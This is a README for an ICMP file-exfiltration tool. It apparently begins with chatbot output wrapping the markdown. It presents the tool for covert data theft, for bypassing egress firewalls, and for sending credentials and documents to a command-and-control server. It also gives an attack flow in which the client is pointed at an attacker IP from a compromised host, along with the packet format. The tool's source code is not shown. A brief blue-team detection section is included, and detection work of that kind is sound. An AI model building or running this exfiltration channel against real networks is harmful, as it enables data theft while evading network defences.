# ping0-exfil

Here’s a professional and complete `README.md` tailored for GitHub that explains how this ICMP-based file transfer tool can be used for **data exfiltration**, especially in **Red Team** and **penetration testing** scenarios.

---

```
# 🛠️ ICMP File Transfer Toolkit — `ping-exfil`

A cross-platform file exfiltration tool that transfers data covertly using ICMP echo request ("ping") packets. Works on both **Windows and Linux**. The toolkit includes two components:

- **`client.py`** — Sends a file to a target over raw ICMP.
- **`server.py`** — Listens for and reconstructs the file from incoming ICMP packets.

> 📢 **For Educational and Red Team Use Only**  
> Do not deploy this tool without explicit permission. ICMP-based exfiltration techniques are often used in **covert channels** and may bypass traditional firewalls and network inspection tools.

---

## 📦 Features

- 🛰️ **Protocolless Exfiltration** – Works via raw ICMP echo request packets; does not use TCP or UDP.
- 🧩 **Chunked Transfer** – Files are split into verifiable chunks (with SHA-256 hashes) to maintain integrity.
- ✅ **Checksum Validation** – Ensures complete file and chunk integrity on the receiver side.
- 💻 **Cross-Platform Support** – Works on Linux and Windows (requires admin/root).
- 🔐 **Firewall Evasion Potential** – Mimics normal ping traffic, which is often permitted even on restricted networks.

---

## 🚀 Use Cases in Red Teaming

| Scenario | Description |
|---------|-------------|
| 🧱 **Bypass Egress Filters** | Many corporate firewalls allow ICMP for diagnostics. This tool sneaks data out without opening TCP/UDP ports. |
| 🕵️ **Covert Data Theft** | Transfers sensitive files (e.g., credentials, documents) back to a command-and-control (C2) server using standard ping traffic. |
| 🧪 **Network Detection Testing** | Test how well IDS/IPS or SIEM tools can detect abnormal ICMP traffic and payloads. |
| 🐚 **Staging Payloads** | Transfer binary payloads to a foothold machine without raising HTTP/DNS traffic. |

---

## 🧪 Example Attack Flow

1. ✅ **Attacker Setup**  
   Run the ICMP listener (`server.py`) on a remote machine with a public or reachable internal IP:
   ```
   sudo python3 server.py
   ```

2. 📤 **Victim Exfiltration**  
   On the compromised host:
   ```
   sudo python3 client.py <attacker-ip>
   ```
   The script will ask:
   ```
   Enter path of file to send:
   ```

3. 💾 **Server Reconstructs File**  
   The listener validates all chunks, verifies the full SHA-256 hash, and writes the reassembled file with the original filename.

---

## 📁 File Transfer Protocol Design

Each ICMP Echo Request payload includes:
- `FILEXFER` (8 bytes) – Protocol signature.
- `Type` (1 byte) – Start (0), Chunk (1), End (2).
- `Chunk #` (2 bytes) – Packet index.
- `Hash` (32 bytes) – SHA-256 of the chunk.
- `Payload` – Either filename, file chunk, or final hash.

The receiver reassembles chunks in order, verifies the full hash, and saves the result.

---

## ⚠️ Limitations

- ❗ Must be run with root/admin permissions.
- 🐢 Slower than TCP transfers due to ICMP rate limits.
- 🔍 Detectable by deep packet inspection (DPI) if not obfuscated.
- 🔒 May be blocked by hardened security environments or cloud systems.

---

## 🛡️ Detection & Prevention Tips

> For blue teams looking to detect such behavior:

- Monitor **ICMP echo requests with unusually large payloads**.
- Set up alerts for **frequent pings with non-standard sizes**.
- Use **packet inspection tools** (e.g., Suricata, Zeek) to flag ICMP anomalies.
- Block or rate-limit outbound ICMP traffic where not necessary.



## 🧰 Dependencies

Only uses Python’s standard library (no pip dependencies):
- `socket`
- `struct`
- `hashlib`
- `os`, `sys`



